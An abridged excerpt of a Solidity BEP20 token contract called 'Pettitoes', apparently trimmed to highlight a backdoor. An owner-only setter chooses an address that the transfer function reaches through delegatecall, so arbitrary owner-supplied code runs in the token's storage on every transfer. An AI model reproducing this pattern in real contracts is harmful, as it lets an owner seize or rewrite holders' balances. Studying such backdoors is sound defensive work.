...
contract Pettitoes is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Pettitoes';
  ...
  */
  ...
  function claimDividendPET(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_PET.delegatecall(
  ...
  function SetBonusPET(address c) public onlyOwner {
    C_PET = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendPET(sender, recipient, amount);   
